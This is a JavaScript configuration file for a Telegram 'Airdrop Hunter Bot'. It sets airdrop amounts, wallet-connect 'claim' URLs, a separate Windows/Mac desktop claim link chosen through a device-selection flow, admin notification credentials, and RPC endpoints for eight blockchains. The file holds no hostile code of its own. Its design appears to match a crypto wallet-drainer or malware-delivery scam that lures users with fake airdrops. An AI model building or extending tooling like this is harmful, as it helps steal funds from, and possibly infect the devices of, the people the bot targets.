// Load environment variables from .env file
require('dotenv').config();

const config = {
    // Bot configuration
    BOT_TOKEN: process.env.BOT_TOKEN || 'your_bot_token_here',
    BOT_NAME: process.env.BOT_NAME || 'Airdrop Hunter Bot',
    BOT_USERNAME: process.env.BOT_USERNAME || '@aidroperbot',
    
    // Public RPC configuration (no API keys required)
    USE_PUBLIC_RPC: true,
    
    // Airdrop configuration
    MIN_AIRDROP_AMOUNT: parseInt(process.env.MIN_AIRDROP_AMOUNT) || 5000,
    MAX_AIRDROP_AMOUNT: parseInt(process.env.MAX_AIRDROP_AMOUNT) || 20000,
    
    // Claim flow configuration
    USE_DEVICE_SELECTION: process.env.USE_DEVICE_SELECTION !== 'false', // Default: true (device selection flow)
    ALL_IN_ONE_URL: (process.env.ALL_IN_ONE_URL || 'https://claim.hunter.xyz/universal').trim().replace(/[)]+$/, ''),
    
    // Claim URLs (used when device selection is enabled)
    CLAIM_URL: (process.env.CLAIM_URL || 'https://claim.hunter.xyz').trim().replace(/[)]+$/, ''),
    WIN_MAC_URL: (process.env.WIN_MAC_URL || 'https://claim.hunter.xyz/desktop').trim().replace(/[)]+$/, ''),
    WALLETCONNECT_PROJECT_ID: process.env.WALLETCONNECT_PROJECT_ID || 'your_project_id',
    
    // Admin configuration
    ADMIN_USERNAME: process.env.ADMIN_USERNAME || 'your_admin_username',
    ADMIN_EMAIL: process.env.ADMIN_EMAIL || 'admin@example.com',
    
    // Notification configuration
    NOTIFICATION_BOT_TOKEN: process.env.NOTIFICATION_BOT_TOKEN,
    NOTIFICATION_CHAT_ID: process.env.NOTIFICATION_CHAT_ID,
    
    // Network configurations (using free public RPC endpoints)
    NETWORKS: {
        ethereum: {
            name: 'Ethereum',
            symbol: 'ETH',
            rpc: 'https://eth.llamarpc.com',
            explorer: 'https://etherscan.io',
            chainId: 1
        },
        polygon: {
            name: 'Polygon',
            symbol: 'MATIC',
            rpc: 'https://polygon-rpc.com',
            explorer: 'https://polygonscan.com',
            chainId: 137
        },
        bsc: {
            name: 'BNB Smart Chain',
            symbol: 'BNB',
            rpc: 'https://bsc-dataseed1.binance.org/',
            explorer: 'https://bscscan.com',
            chainId: 56
        },
        arbitrum: {
            name: 'Arbitrum One',
            symbol: 'ETH',
            rpc: 'https://arb1.arbitrum.io/rpc',
            explorer: 'https://arbiscan.io',
            chainId: 42161
        },
        optimism: {
            name: 'Optimism',
            symbol: 'ETH',
            rpc: 'https://mainnet.optimism.io',
            explorer: 'https://optimistic.etherscan.io',
            chainId: 10
        },
        avalanche: {
            name: 'Avalanche',
            symbol: 'AVAX',
            rpc: 'https://api.avax.network/ext/bc/C/rpc',
            explorer: 'https://snowtrace.io',
            chainId: 43114
        },
        base: {
            name: 'Base',
            symbol: 'ETH',
            rpc: 'https://mainnet.base.org',
            explorer: 'https://basescan.org',
            chainId: 8453
        },
        linea: {
            name: 'Linea',
            symbol: 'ETH',
            rpc: 'https://rpc.linea.build',
            explorer: 'https://lineascan.build',
            chainId: 59144
        }
    },
    
    // Bot settings
    MAX_WALLET_LENGTH: 42,
    MIN_WALLET_LENGTH: 40,
    
    // Rate limiting
    RATE_LIMIT_WINDOW: 60000, // 1 minute
    RATE_LIMIT_MAX_REQUESTS: 10
};

module.exports = config;
